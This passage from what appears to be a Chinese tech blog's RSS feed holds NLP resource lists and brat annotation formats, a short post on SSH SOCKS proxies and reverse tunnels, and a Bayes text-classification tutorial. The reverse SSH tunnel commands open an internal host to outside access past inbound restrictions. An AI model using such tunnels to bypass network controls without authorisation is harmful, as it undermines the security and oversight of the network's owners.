&lt;td&gt;&lt;a href=&#34;https://github.com/juand-r/entity-recognition-datasets#references&#34;&gt;https://github.com/juand-r/entity-recognition-datasets#references&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;A collection of corpora for named entity recognition (NER) and entity recognition tasks. These annotated datasets cover a variety of languages, domains and entity types.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;学习资料&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ad%a6%e4%b9%a0%e8%b5%84%e6%96%99&#34;&gt;
        ##
    &lt;/a&gt;
    学习资料
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;nlp-roadmap&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#nlp-roadmap&#34;&gt;
        #
    &lt;/a&gt;
    NLP roadmap
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/graykode/nlp-roadmap&#34;&gt;https://github.com/graykode/nlp-roadmap&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;probability--statistics&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#probability--statistics&#34;&gt;
        ##
    &lt;/a&gt;
    Probability &amp;amp; Statistics
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://github.com/graykode/nlp-roadmap/raw/master/img/prob.png&#34; alt=&#34;Probability &amp;amp; Statistics&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;machine-learning&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#machine-learning&#34;&gt;
        ##
    &lt;/a&gt;
    Machine Learning
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://github.com/graykode/nlp-roadmap/raw/master/img/ml.png&#34; alt=&#34;Machine Learning&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;text-mining&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#text-mining&#34;&gt;
        ##
    &lt;/a&gt;
    Text Mining
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://github.com/graykode/nlp-roadmap/raw/master/img/textmining.png&#34; alt=&#34;Text Mining&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;natural-language-processing&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#natural-language-processing&#34;&gt;
        ##
    &lt;/a&gt;
    Natural Language Processing
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://github.com/graykode/nlp-roadmap/raw/master/img/nlp.png&#34; alt=&#34;Natural Language Processing&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;标注工具&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a0%87%e6%b3%a8%e5%b7%a5%e5%85%b7&#34;&gt;
        ##
    &lt;/a&gt;
    标注工具
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;| 工具 | 链接 | 描述 |
|&amp;mdash;+&amp;mdash;+&amp;mdash;|
| Prodigy |https://prodi.gy/docs/|Prodigy (explosion.ai 开发 spacy 的公司)|
| brat |https://github.com/nlplab/brat||
| Knowtator |http://knowtator.sourceforge.net/index.shtml||
| Protégé + Knowtator plugin |https://github.com/UCDenver-ccp/Knowtator-2.0 &lt;a href=&#34;https://protege.stanford.edu/short-courses.php&#34;&gt;https://protege.stanford.edu/short-courses.php&lt;/a&gt;||
||http://deepdive.stanford.edu/labeling||
||https://github.com/SongRb/DeepDiveChineseApps||
||https://github.com/qiangsiwei/DeepDive_Chinese||
||https://github.com/jiesutd/SUTDAnnotator||
||https://github.com/HazyResearch/snorkel||
||https://bitbucket.org/dainkaplan/slate/||
| iepy | &lt;a href=&#34;https://github.com/machinalis/iepy&#34;&gt;https://github.com/machinalis/iepy&lt;/a&gt; | 标注，信息提取 |
| doccano |https://github.com/chakki-works/doccano||
| YEDDA |https://github.com/jiesutd/YEDDA||
| Chinese-Annotator | &lt;a href=&#34;https://github.com/deepwel/Chinese-Annotator&#34;&gt;https://github.com/deepwel/Chinese-Annotator&lt;/a&gt; | online/offline 结合的中文标注工具，想法比较好，目前项目还不完善 |
| HanNLP | &lt;a href=&#34;https://github.com/hankcs/HanLP&#34;&gt;https://github.com/hankcs/HanLP&lt;/a&gt; | NLP 工具箱（中文分词 词性标注 命名实体识别 依存句法分析 新词发现 关键词短语提取 自动摘要 文本分类聚类 拼音简繁），Java语言 |
| poplar |https://github.com/synyi/poplar|国内“森亿”公司开发|&lt;/p&gt;
&lt;h2 id=&#34;brat&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#brat&#34;&gt;
        #
    &lt;/a&gt;
    brat
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;brat-配置&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#brat-%e9%85%8d%e7%bd%ae&#34;&gt;
        ##
    &lt;/a&gt;
    brat 配置
&lt;/div&gt;
&lt;/h3&gt;
&lt;h4 id=&#34;annotation-配置-annotationconf&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#annotation-%e9%85%8d%e7%bd%ae-annotationconf&#34;&gt;
        ###
    &lt;/a&gt;
    Annotation 配置 annotation.conf
&lt;/div&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;[entities]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[entities]	 
Person
Location
Organization
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;[relations]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数指定格式 &amp;ldquo;ARG:TYPE&amp;rdquo;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[relations]	 
Family	Arg1:Person, Arg2:Person
Employment	Arg1:Person, Arg2:Organization
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参数可以有多个，使用 &amp;ldquo;|&amp;rdquo; 分隔&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[relations]	 	 
Located	Arg1:Person,	Arg2:Building|City|Country
Located	Arg1:Building,	Arg2:City|Country
Located	Arg1:City,	Arg2:Country
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;[events]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;事件参数格式 &amp;ldquo;ROLE:TYPE&amp;rdquo;, ROLE 可以任意指定。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[events]	 
Marriage	Participant1:Person, Participant2:Person
Bankruptcy	Org:Company
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;[attributes]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;属性作用域 &amp;ldquo;ARG:TYPE&amp;rdquo; ，可以用在 relation 和 event 中。&lt;/p&gt;
&lt;p&gt;拥有多个值的属性的值的定义方法是 &amp;ldquo;Value:VAL1|VAL2|VAL3[&amp;hellip;]&amp;rdquo;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[attributes]	 
Negated	Arg:&amp;lt;EVENT&amp;gt;
Confidence	Arg:&amp;lt;EVENT&amp;gt;, Value:L1|L2|L3
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;brat-标注信息格式&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#brat-%e6%a0%87%e6%b3%a8%e4%bf%a1%e6%81%af%e6%a0%bc%e5%bc%8f&#34;&gt;
        ##
    &lt;/a&gt;
    brat 标注信息格式
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://brat.nlplab.org/standoff.html&#34;&gt;http://brat.nlplab.org/standoff.html&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;T1	Organization 0 4	Sony
T2	MERGE-ORG 14 27	joint venture
T3	Organization 33 41	Ericsson
E1	MERGE-ORG:T2 Org1:T1 Org2:T3
T4	Country 75 81	Sweden
R1	Origin Arg1:T3 Arg2:T4
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;protege--knowtator&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#protege--knowtator&#34;&gt;
        #
    &lt;/a&gt;
    Protege &amp;amp; Knowtator
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;编译 Knowtator 插件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/UCDenver-ccp/Knowtator-2.0.git
mvn clean install
cp xxx/plugins/knowtator-2.1.5.jar /Applications/Protégé.app/Contents/Java/plugins/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重启 Protege&lt;/p&gt;
&lt;h2 id=&#34;iepy&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#iepy&#34;&gt;
        #
    &lt;/a&gt;
    iepy
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;iepy 的 preprcess.py 会失败，需要按照以下方式修改 corenlp.sh 脚本&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Preprocess not running under MacOS&lt;/p&gt;
&lt;p&gt;Problems with the preprocess under MacOS? Apparently a change in the CoreNLP script is needed to be run. You need to change the file corenlp.sh that is located on /Users/&lt;your user&gt;/Library/Application Support/iepy/stanford-corenlp-full-2014-08-27/ and change scriptdir=&lt;code&gt;dirname $0&lt;/code&gt; for scriptdir=&lt;code&gt;dirname &amp;quot;$0&amp;quot;&lt;/code&gt; (ie, add double quotes around $0)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://iepy.readthedocs.io/en/stable/troubleshooting.html#troubleshooting&#34;&gt;https://iepy.readthedocs.io/en/stable/troubleshooting.html#troubleshooting&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;自然语言处理工具&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%87%aa%e7%84%b6%e8%af%ad%e8%a8%80%e5%a4%84%e7%90%86%e5%b7%a5%e5%85%b7&#34;&gt;
        ##
    &lt;/a&gt;
    自然语言处理工具
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;自然语言处理 中文分词 词性标注 命名实体识别 依存句法分析 新词发现 关键词短语提取 自动摘要 文本分类聚类 拼音简繁&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP&#34;&gt;https://github.com/hankcs/HanLP&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;nlp-应用&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#nlp-%e5%ba%94%e7%94%a8&#34;&gt;
        ##
    &lt;/a&gt;
    NLP 应用
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;聊天机器人&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%81%8a%e5%a4%a9%e6%9c%ba%e5%99%a8%e4%ba%ba&#34;&gt;
        #
    &lt;/a&gt;
    聊天机器人
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/3c6f1e32e128&#34;&gt;用 TensorFlow 做个聊天机器人&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;论文&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%ae%ba%e6%96%87&#34;&gt;
        ##
    &lt;/a&gt;
    论文
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;http://nlp.seas.harvard.edu/2018/04/03/attention.html&#34;&gt;http://nlp.seas.harvard.edu/2018/04/03/attention.html&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>ssh代理方法</title>
      <link>/2019/09/ssh%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 01 Sep 2019 15:28:41 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/09/ssh%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/</guid>
      <description>&lt;!--toc--&gt;
&lt;h1 id=&#34;socks-代理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#socks-%e4%bb%a3%e7%90%86&#34;&gt;
        ##
    &lt;/a&gt;
    SOCKS 代理
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;在本地打开 11087 端口，通过该端口可以使用 socks4/socks5 协议连接到目标机（1.2.3.4）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;alias proxy=&amp;#39;ssh -D 11087 -fnqN user@1.2.3.4&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;ssh-反向连接&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ssh-%e5%8f%8d%e5%90%91%e8%bf%9e%e6%8e%a5&#34;&gt;
        ##
    &lt;/a&gt;
    ssh 反向连接
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;当不方便从外连接到内部网络的机器时可以在内部机器上使用反向连接的方式连接到的方式打通外部机器到内部机器的 ssh 通道&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh -p 22 -qngNTR 10000:localhost:22 proxyuser@proxynode
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ssh-反向连接时建立-socks-代理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ssh-%e5%8f%8d%e5%90%91%e8%bf%9e%e6%8e%a5%e6%97%b6%e5%bb%ba%e7%ab%8b-socks-%e4%bb%a3%e7%90%86&#34;&gt;
        #
    &lt;/a&gt;
    ssh 反向连接时建立 SOCKS 代理
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh -p 10000 -qngfNTD 6767 nodeuser@localhost
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ssh-传递连接&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ssh-%e4%bc%a0%e9%80%92%e8%bf%9e%e6%8e%a5&#34;&gt;
        #
    &lt;/a&gt;
    ssh 传递连接
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh -qngfNT -L localhost:6868:localhost:6767 proxyuser@proxynode
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将本机的 6868 端口接收到的数据发送到 proxynode 机器所在的 localhost:6767 端口，因为 6767 是 SOCK5 反向连接到了另一台机器，因此 6868 的流量实际被发到了另外的那一台机器上。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>机器学习笔记 - 贝叶斯分类法推导</title>
      <link>/2019/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB%E6%B3%95%E6%8E%A8%E5%AF%BC/</link>
      <pubDate>Fri, 09 Aug 2019 10:57:50 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB%E6%B3%95%E6%8E%A8%E5%AF%BC/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;这篇笔记记录了最近对贝叶斯分类法的学习和理解。&lt;/p&gt;
&lt;h1 id=&#34;1概率基本概念回顾&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1%e6%a6%82%e7%8e%87%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5%e5%9b%9e%e9%a1%be&#34;&gt;
        ##
    &lt;/a&gt;
    1.概率基本概念回顾
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;11概率&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#11%e6%a6%82%e7%8e%87&#34;&gt;
        #
    &lt;/a&gt;
    1.1.概率：
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;事件发生的概率 = $ \dfrac{事件可能发生的个数} {结果的总数} $&lt;/p&gt;
&lt;h2 id=&#34;12事件的分类&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#12%e4%ba%8b%e4%bb%b6%e7%9a%84%e5%88%86%e7%b1%bb&#34;&gt;
        #
    &lt;/a&gt;
    1.2.事件的分类：
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;独立事件：每个事件的发生是独立的，不受其他事件的影响，例如：抛硬币，掷骰子。&lt;/li&gt;
&lt;li&gt;相关事件：当前事件受之前发生事件的影响，例如：抽扑克牌。&lt;/li&gt;
&lt;li&gt;互斥事件：事件发生只能是其一，不能同时发生，例如：一枚硬币不能同时为正面和反面。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;13独立事件的概率&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#13%e7%8b%ac%e7%ab%8b%e4%ba%8b%e4%bb%b6%e7%9a%84%e6%a6%82%e7%8e%87&#34;&gt;
        #
    &lt;/a&gt;
    1.3.独立事件的概率：
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;单个独立事件的概率： P(A) = $ \dfrac{事件可能发生的个数} {结果的总数} $&lt;/li&gt;
&lt;li&gt;事件A和B发生的概率（多个独立事件的概率）： P(A B) = P(A) * P(B)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;14条件概率&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#14%e6%9d%a1%e4%bb%b6%e6%a6%82%e7%8e%87&#34;&gt;
        #
    &lt;/a&gt;
    1.4.条件概率：
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;在相关事件的情况中应用条件概率，用 P(B|A) 表示在事件 A 发生的条件下事件 B 发生的概率。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;事件A和B发生的概率： P(A B) = P(A) * P(B|A)&lt;/p&gt;
&lt;p&gt;另外一个有用的公式转换： P(B|A) = $ \dfrac{P(A B)} {P(A)} $&lt;/p&gt;
&lt;p&gt;在事件 A 发生的情况下 B 发生的概率等于事件 A 和 B 的概率除以事件 A 的概率&lt;/p&gt;
&lt;p&gt;例子：冰淇淋&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  在你的社交群组里，70% 喜欢巧克力冰淇淋，35% 喜欢巧克力和草莓。

  在喜欢巧克力的人里，也喜欢草莓的百分比是多少？

  P(草莓|巧克力) = P(巧克力 与 草莓) / P(巧克力)

  0.35 / 0.7 = 50%

  在喜欢巧克力的人里，50% 也喜欢草莓
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;141-尝试计算下面的概率&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#141-%e5%b0%9d%e8%af%95%e8%ae%a1%e7%ae%97%e4%b8%8b%e9%9d%a2%e7%9a%84%e6%a6%82%e7%8e%87&#34;&gt;
        ##
    &lt;/a&gt;
    1.4.1. 尝试计算下面的概率
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;4个人在5个数字中各选一个数字，请问任何两个人选重的概率是多少？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/08/bayes-classification/events-dependent-ex-3.svg&#34; alt=&#34;events-dependent-ex-3.svg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2贝叶斯定理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2%e8%b4%9d%e5%8f%b6%e6%96%af%e5%ae%9a%e7%90%86&#34;&gt;
        ##
    &lt;/a&gt;
    2.贝叶斯定理
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;$ P(A|B) = \dfrac {P(A)*P(B|A)} {P(B)} $&lt;/p&gt;
&lt;p&gt;在 B 发生的情况下发生 A 事件的概率 P(A|B) 可以通过已知 A 发生情况下 B 发生的概率和 A 与 B 的独自发生的概率求出来。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;P(A|B)：在 B 发生的情况下 A 发生的概率&lt;/li&gt;
&lt;li&gt;P(A)：A 发生的概率&lt;/li&gt;
&lt;li&gt;P(B)：B 发生的概率&lt;/li&gt;
&lt;li&gt;P(B|A)：在 A 发生的情况下 B 发生的概率&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;**例子1：**计算天气有云时下雨的概率：&lt;/p&gt;
&lt;p&gt;$ P(雨|云) = \dfrac {P(雨)*P(云|雨)} {P(云)} $&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;P(雨)：下雨的概率 = 10%&lt;/li&gt;
&lt;li&gt;P(云|雨)：下雨时有云的概率 = 50%&lt;/li&gt;
&lt;li&gt;P(云)：有云的概率 = 40%&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$ P(雨|云) = \dfrac {0.1 * 0.5} {0.4} = 0.125 $&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;例子2：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有一种疾病检测手段，但是这种检测手段并不准确&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在真正有这种疾病的人中有 80% 的人可以被检测出&lt;/li&gt;
&lt;li&gt;对于没有这种疾病的人有 10% 的概率会被错误检测出&lt;/li&gt;
&lt;li&gt;以往的统计数据表明人群中有 1% 的人得了这种疾病，99% 的人没有得过&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;请问，当有一个人被检测出有该疾病时他真正有这种病的概率是多少？&lt;/p&gt;
&lt;p&gt;$ P(真有病|检测有病) = \dfrac {P(真有病) * P(检测有病|真有病)} {P(检测有病)} $&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;真实情况 \ 检测结果&lt;/th&gt;
&lt;th&gt;检测有病&lt;/th&gt;
&lt;th&gt;检测没病&lt;/th&gt;
&lt;th&gt;得病统计&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;真有病&lt;/td&gt;
&lt;td&gt;80%&lt;/td&gt;
&lt;td&gt;20%&lt;/td&gt;
&lt;td&gt;1%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;真没病&lt;/td&gt;
&lt;td&gt;10%&lt;/td&gt;
&lt;td&gt;90%&lt;/td&gt;
&lt;td&gt;99%&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;P(真有病)：1%&lt;/li&gt;
&lt;li&gt;P(检测有病|真有病)：80%&lt;/li&gt;
&lt;li&gt;P(检测有病)：P(没有病的人被检测出有病的概率) + P(真有病的人被检测出有病的概率)
&lt;ul&gt;
&lt;li&gt;P(没有病的人被检测出有病的概率) = P(真没病) * P(检测有病|真没病) = 99% * 10% = 0.099&lt;/li&gt;
&lt;li&gt;P(真有病的人被检测出有病的概率) = P(真有病) * P(检测有病|真有病) = 1% * 80% = 0.008&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$ P(真有病|检测有病) = \dfrac {1% * 80%} { 99% * 10% + 1% * 80%} =  7.48% $&lt;/p&gt;
&lt;p&gt;示意图：&lt;/p&gt;
&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/08/bayes-classification/disease_1.jpeg&#34; style=&#34;width:400px&#34;/&gt;
&lt;p&gt;计算方法：&lt;/p&gt;
&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/08/bayes-classification/disease_2.jpeg&#34; style=&#34;width:600px&#34;/&gt;
&lt;p&gt;那么怎么评估这个方法是否有效呢？可以使用准确度（Precision）和召回（Recall）两个指标来评估。&lt;/p&gt;
&lt;p&gt;$ Precision = \dfrac {TP} {TP + FP} = \dfrac {P(真有病) * P(检测有病|真有病)} {P(检测有病)} = \dfrac {1% * 80%} {1% * 80% + 99% * 10%} = 7.48%$&lt;/p&gt;
&lt;p&gt;$ Recall = \dfrac {TP} {TP + FN} = \dfrac {P(真有病) * P(检测有病|真有病)} {P(真有病)} = \dfrac {1% * 80%} {1%} = 80% $&lt;/p&gt;
&lt;h1 id=&#34;3贝叶斯定理在机器学习中的应用---文本分类&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3%e8%b4%9d%e5%8f%b6%e6%96%af%e5%ae%9a%e7%90%86%e5%9c%a8%e6%9c%ba%e5%99%a8%e5%ad%a6%e4%b9%a0%e4%b8%ad%e7%9a%84%e5%ba%94%e7%94%a8---%e6%96%87%e6%9c%ac%e5%88%86%e7%b1%bb&#34;&gt;
        ##
    &lt;/a&gt;
    3.贝叶斯定理在机器学习中的应用 - 文本分类
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;**任务目标：**通过利用一批分好类（2类：正常/非正常）的文本信息，训练一个模型来识别一段给定文字，判断是不是正常言论。&lt;/p&gt;
&lt;p&gt;$ P(类别|数据) = \dfrac {P(类别) * P(数据|类别)} {P(数据)} $&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当 P(正常|数据) &amp;gt; P(不正常|数据) 时认为文本为“正常”&lt;/li&gt;
&lt;li&gt;当 P(正常|数据) &amp;lt; P(不正常|数据) 时认为文本为“不正常”&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;算法推导：&lt;/p&gt;
&lt;p&gt;进一步把问题转换成下面的表达方式：&lt;/p&gt;
&lt;p&gt;$ P(class|words) = \dfrac {P(words|class) * P(class)} {P(words)} $&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;class：代表类别&lt;/li&gt;
&lt;li&gt;words：代表一句话，它是由一组单词构成的，记做：w0, w1, w2, &amp;hellip;, wn&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$ P(class|w0, w0, w1, w2, &amp;hellip;, wn) = \dfrac {P(w0, w1, w2, &amp;hellip;, wn|class) * P(class)} {P(w0, w1, w2, &amp;hellip;, wn)} $&lt;/p&gt;
&lt;p&gt;由于 P(w0, w1, w2, &amp;hellip;, wn|class) 非常难于计算因此通过条件独立性假设把这个概率进行简化计算，最终转换成计算 P(w0|class)P(w1|class)P(w2|class)&amp;hellip;P(wn|class)。&lt;/p&gt;
&lt;p&gt;$ P(class|w0, w0, w1, w2, &amp;hellip;, wn) = \dfrac {P(w0|class)*P(w1|class)*P(w2|class)&amp;hellip;P(wn|class) * P(class)} {P(w0, w1, w2, &amp;hellip;, wn)} $&lt;/p&gt;
&lt;p&gt;训练方法就转换成根据已提供的数据计算下列概率值得过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个类别中出现某个单词的概率 P(w0|class), P(w1|class), P(w2|class)&amp;hellip;P(wn|class)&lt;/li&gt;
&lt;li&gt;训练数据中某个类别的概率 P(class)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比较 P(class1|w0, w0, w1, w2, &amp;hellip;, wn) P(class2|w0, w0, w1, w2, &amp;hellip;, wn) 可以简化成比较&lt;/p&gt;
&lt;p&gt;$ P(w0|class1)*P(w1|class1)*P(w2|class1)&amp;hellip;P(wn|class1) * P(class1) $&lt;/p&gt;
&lt;p&gt;$ P(w0|class2)*P(w1|class2)*P(w2|class2)&amp;hellip;P(wn|class2) * P(class2) $&lt;/p&gt;
&lt;p&gt;**注意：**实际计算中很少直接使用这样的乘法进行计算，主要原因是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;乘法运算计算量相对加法来说是复杂很多的&lt;/li&gt;
&lt;li&gt;由于每一项 P(wn|class1) 值很小或者为0（有时为了避免所有项为0会把每一项给一个初始化很小的数字），因此容易导致计算结果直接为0或者由于太小造成下溢出&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以，在实际情况下多使用 log 运算，根据 log 的性质可以进一步简化成比较：&lt;/p&gt;
&lt;p&gt;$ log(P(w0|class1)*P(w1|class1)*P(w2|class1)&amp;hellip;P(wn|class1) * P(class1)) = log(P(w0|class1) + log(P(w1|class1) + log(P(w2|class1) + &amp;hellip;  + log(P(wn|class1) + log(class1)$&lt;/p&gt;
&lt;p&gt;$ log(P(w0|class2)*P(w1|class2)*P(w2|class2)&amp;hellip;P(wn|class2) * P(class2)) = log(P(w0|class2) + log(P(w1|class2) + log(P(w2|class2) + &amp;hellip;  + log(P(wn|class2) + log(class2)$&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;另外使用 log 进行计算还有额外的好处：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先是直接将乘法运算转换成了加法，计算速度得到提升&lt;/li&gt;
&lt;li&gt;每一项 log(P(wn|class) 都可以在训练阶段固化，操作中可以直接用查表法解决进一步减少运算量&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后，引用一下来自《机器学习实战》的例子：&lt;/p&gt;
